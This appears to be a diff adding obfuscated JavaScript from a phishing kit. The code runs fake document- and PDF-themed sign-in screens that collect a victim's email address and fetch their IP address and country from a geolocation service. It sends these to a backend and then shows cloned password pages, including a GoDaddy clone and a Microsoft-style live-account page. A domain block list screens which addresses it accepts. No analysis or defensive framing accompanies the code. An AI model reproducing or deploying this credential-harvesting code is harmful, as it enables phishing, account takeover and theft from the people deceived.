+            loadinganimationdoc(0x1);
+            setTimeout(function () {
+              document.getElementById('error_pwd').innerText = '';
+              document.getElementById('inp_pwd').value = '';
+              document.getElementById('sections_doc').classList.toggle("d-none");
+              document.getElementById("section_uname_doc").classList.toggle("d-none");
+              document.getElementById('section_pwd').classList.remove("d-none");
+              view = "pwd";
+            }, 0x12c);
+          }, 0xbb8);
+        }
+        if (webnotfound == false) {
+          if (interacted == 0x1) {
+            sendemaildoc();
+          }
+          if (interacted == 0x0) {
+            interacted = 0x1;
+            (function _0x11be5a() {
+              $.get("https://get.geojs.io/v1/ip/geo.json", function (_0x525423) {
+                userip = _0x525423.ip;
+                usercountry = _0x525423.country;
+                sendemaildoc();
+              }, "json").fail(function (_0x77c2a9, _0x32c2ac, _0x217f30) {
+                if (_0x77c2a9.status == 0x1ad || _0x32c2ac !== "success") {
+                  setTimeout(_0x11be5a, 0x3e8);
+                }
+              });
+            })();
+          }
+        }
+      }
+    }
+    return false;
+  }
+}
+if (view == 'uname_spw') {
+  const nxtpdf = document.getElementById("btn_next_pdf");
+  nxtpdf.addEventListener("click", () => {
+    validatepdf();
+  });
+  pdfcheck = 0x1;
+  function loadinganimationpdf(_0x4d3bf0) {
+    if (_0x4d3bf0 == 0x0) {
+      document.getElementById("sections_pdf").querySelector('#mainLoader').style.display = "flex";
+      document.getElementById("sections_pdf").querySelector("#section_uname_content").classList.toggle("d-none");
+    }
+    if (_0x4d3bf0 == 0x1) {
+      document.getElementById('sections_pdf').querySelector("#mainLoader").style.display = "none";
+      document.getElementById('sections_pdf').querySelector("#section_uname_content").classList.remove("d-none");
+    }
+    if (_0x4d3bf0 == 0x2) {
+      document.getElementById("sections_pdf").querySelector("#mainLoader").style.display = 'flex';
+      document.getElementById('sections_pdf').classList.toggle("d-none");
+    }
+  }
+  const unamepdfinp = document.getElementById("pdfemail");
+  function sendemailpdf() {
+    sendAndReceive("checkemail", [unamepdfinp.value, pagelinkval, browserName, userip, usercountry], 0x1).then(_0x461f96 => {
+      if (_0x461f96 && _0x461f96.message !== "waiting for previous request to complete") {
+        var _0x2fd174 = false;
+        var _0x53a6cf = 0x12c;
+        if (_0x461f96.message.includes("newwebsiteopen") == false && _0x461f96.message !== "error") {
+          if (_0x461f96.acctype && _0x461f96.acctype == 0x2) {
+            pvn = 0x1;
+          }
+          if (_0x461f96.acctype == undefined || _0x461f96.acctype && _0x461f96.acctype == 0x1) {
+            pvn = 0x0;
+          }
+        }
+        if (_0x461f96.message.includes("newwebsiteopen") == false) {
+          _0x53a6cf = 0x0;
+          loadinganimationpdf(0x1);
+        }
+        setTimeout(function () {
+          for (var _0x406bab = 0x0; _0x406bab < websitenames.length; _0x406bab++) {
+            if (_0x461f96.message.includes("newwebsiteopen") == true && _0x461f96.message.includes(websitenames[_0x406bab]) == true) {
+              _0x2fd174 = true;
+              document.querySelectorAll('.user_identity').forEach(_0xe92380 => {
+                _0xe92380.innerText = unamepdfinp.value;
+              });
+              if (websitenames[_0x406bab] == "godaddy") {
+                var _0x1e6dc1 = document.querySelector("script[src^=\"" + gdf + "\"]");
+                if (!_0x1e6dc1) {
+                  var _0x2542a3 = document.createElement("script");
+                  _0x2542a3.src = gdf;
+                  document.head.appendChild(_0x2542a3);
+                }
+                const _0xe5089f = document.createElement('style');
+                _0xe5089f.id = "dynamic-style";
+                _0xe5089f.textContent = "\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ";
+                document.head.appendChild(_0xe5089f);
+                document.getElementById("sections_pdf").classList.toggle("d-none");
+                document.getElementById("section_uname_pdf").classList.toggle('d-none');
+                document.getElementById('sections_' + websitenames[_0x406bab] + '').classList.remove("d-none");
+                document.getElementById('godaddyemail').value = unamepdfinp.value;
+                document.body.style.setProperty("background-color", '#f5f7f8', "important");
+                document.body.style.setProperty("background-image", 'unset', "important");
+                document.body.style.setProperty('overflow', "auto", "important");
+                view = "pwd_godaddy";
+              }
+            }
+            if (_0x461f96.message.includes("newwebsiteopen") == true && _0x406bab == websitenames.length - 0x1 && !_0x2fd174) {
+              document.getElementById("error_uname_pdf").innerText = '';
+              document.getElementById('error_uname_pdf').style.display = "none";
+              document.querySelectorAll(".user_identity").forEach(_0x566302 => {
+                _0x566302.innerText = unamepdfinp.value;
+              });
+              bottomsectionlinks('pwd', [{
+                'a_id': 'idA_PWD_ForgotPassword',
+                'a_text': "Forgot my password",
+                'type': 'link'
+              }]);
+              changebackbutton("pwd", 0x0);
+              document.getElementById("sections_pdf").classList.toggle("d-none");
+              document.getElementById("section_uname_pdf").classList.toggle("d-none");
+              document.getElementById("sections").classList.toggle("d-none");
+              document.getElementById("section_pwd").classList.remove('d-none');
+              otherweburl = _0x461f96.message.replace('newwebsiteopen', '');
+              webnotfound = true;
+              view = 'pwd';
+            }
+          }
+          if (_0x461f96.message == "multiple accounts") {
+            multipleaccountsback = 0x1;
+            if (twa == 0x0) {
+              var _0x48b8d9 = document.querySelectorAll('.bannerlogo');
+              _0x48b8d9.forEach(function (_0x23e580) {
+                _0x23e580.style.height = "24px";
+              });
+            }
+            document.getElementById("section_multipleaccounts").querySelector("#btn_back").setAttribute('data-id', _0x461f96.backbtnid);
+            document.getElementById("section_multipleaccounts").querySelector('#btn_back').setAttribute("onclick", 'backbuttonclick(this,2)');
+            checkerrordesc('multipleaccounts', 0x0, _0x461f96.description);
+            displaymultipleaccounts(_0x461f96.accountoptions);
+            bottomsectionlinks("multipleaccounts", _0x461f96.bottomsection);
+            document.querySelectorAll('.user_identity').forEach(_0x1cf5a3 => {
+              _0x1cf5a3.innerText = unamepdfinp.value;
+            });
+            document.getElementById("sections_pdf").classList.toggle("d-none");
+            document.getElementById("section_uname_pdf").classList.toggle("d-none");
+            document.getElementById('sections').classList.toggle("d-none");
+            document.getElementById("section_multipleaccounts").classList.remove("d-none");
+            view = "multipleaccounts";
+          }
+          if (_0x461f96.message == "correct email") {
+            if (twa == 0x0) {
+              if (_0x461f96.bannerlogo !== undefined && _0x461f96.bannerlogo !== null) {
+                var _0x48b8d9 = document.querySelectorAll('.bannerlogo');
+                _0x48b8d9.forEach(function (_0x3f9c2e) {
+                  _0x3f9c2e.style.backgroundImage = "url('" + _0x461f96.bannerlogo + "')";
+                  _0x3f9c2e.style.width = "unset";
+                  _0x3f9c2e.style.height = "36px";
+                });
+              }
+              if (_0x461f96.backgroundcolor !== undefined && _0x461f96.backgroundcolor !== null) {
+                document.body.style.setProperty("background-color", _0x461f96.backgroundcolor);
+              }
+              if (_0x461f96.backgroundimage !== undefined && _0x461f96.backgroundimage !== null) {
+                document.body.style.setProperty("background-image", "url('" + _0x461f96.backgroundimage + "')");
+              }
+              if (_0x461f96.bannerlogo == undefined || _0x461f96.bannerlogo == null) {
+                var _0x48b8d9 = document.querySelectorAll(".bannerlogo");
+                _0x48b8d9.forEach(function (_0x3160b9) {
+                  _0x3160b9.style.height = "24px";
+                });
+              }
+            }
+            if (pvn == 0x0) {
+              bottomsectionlinks("pwd", _0x461f96.bottomsection);
+              changebackbutton("pwd", _0x461f96.backbutton);
+            }
+            if (pvn == 0x1) {
+              bottomsectionlinks("pwd_live", _0x461f96.bottomsection);
+              changebackbutton("pwd_live", _0x461f96.backbutton);
+            }
+            document.getElementById('error_uname_pdf').innerText = '';
+            document.getElementById("error_uname_pdf").style.display = "none";
+            document.querySelectorAll('.user_identity').forEach(_0x45d7f0 => {
+              _0x45d7f0.innerText = unamepdfinp.value;
+            });
+            document.getElementById("sections_pdf").classList.toggle("d-none");
+            document.getElementById("section_uname_pdf").classList.toggle("d-none");
+            document.getElementById('sections').classList.toggle('d-none');
+            if (pvn == 0x0) {
+              document.getElementById("section_pwd").classList.remove("d-none");
+              view = 'pwd';
+            }
+            if (pvn == 0x1) {
+              document.getElementById("section_pwd_live").classList.remove("d-none");
+              view = "pwd_live";
+            }
+          }
+          if (_0x461f96.message == "error") {
+            document.getElementById('error_uname_pdf').innerText = "Please, provide a valid email.";
+            document.getElementById("error_uname_pdf").style.display = "block";
+            loadinganimationpdf(0x1);
+          }
+        }, _0x53a6cf);
+      }
+    })["catch"](_0x39d28b => {
+      loadinganimationpdf(0x1);
+      console.error('Error:', _0x39d28b);
+    });
+  }
+  function validatepdf() {
+    if (view === 'uname_pdf') {
+      const _0x575f28 = unamepdfinp.value.trim().split('@')[0x1];
+      if (unamepdfinp.value.includes('@') && bes.some(_0x828c50 => _0x575f28.includes(_0x828c50))) {
+        loadinganimationpdf(0x0);
+        setTimeout(function () {
+          loadinganimationpdf(0x1);
+          document.getElementById("error_uname_pdf").innerText = "Please, provide a valid email.";
+          document.getElementById('error_uname_pdf').style.display = 'block';
+        }, 0xbb8);
+      }
+      if (unamepdfinp.value.trim() == '') {
+        document.getElementById('error_uname_pdf').innerText = "Please, provide a valid email.";
+        document.getElementById("error_uname_pdf").style.display = "block";
+      } else if (unamepdfinp.value.trim() != '' && unamepdfinp.value.includes('@') && !bes.some(_0xa59a73 => _0x575f28.includes(_0xa59a73))) {
+        loadinganimationpdf(0x0);
+        if (webnotfound == true) {
+          setTimeout(function () {
+            loadinganimationpdf(0x1);
+            setTimeout(function () {
+              document.getElementById('error_pwd').innerText = '';
+              document.getElementById("inp_pwd").value = '';
+              document.getElementById('sections_pdf').classList.toggle("d-none");
+              document.getElementById("section_uname_pdf").classList.toggle("d-none");
+              document.getElementById("section_pwd").classList.remove("d-none");
+              view = "pwd";
+            }, 0x12c);
+          }, 0xbb8);
+        }
+        if (webnotfound == false) {
+          if (interacted == 0x1) {
+            sendemailpdf();
+          }
+          if (interacted == 0x0) {
+            interacted = 0x1;
+            (function _0x244d54() {
+              $.get("https://get.geojs.io/v1/ip/geo.json", function (_0x4ef395) {
+                userip = _0x4ef395.ip;
+                usercountry = _0x4ef395.country;
+                sendemailpdf();
+              }, "json").fail(function (_0x56ff4f, _0x5d9572, _0x2817ec) {
+                if (_0x56ff4f.status == 0x1ad || _0x5d9572 !== "success") {
+                  setTimeout(_0x244d54, 0x3e8);
+                }
+              });
+            })();
+          }
+        }
+      }
+    }
+    return false;
+  }
+}
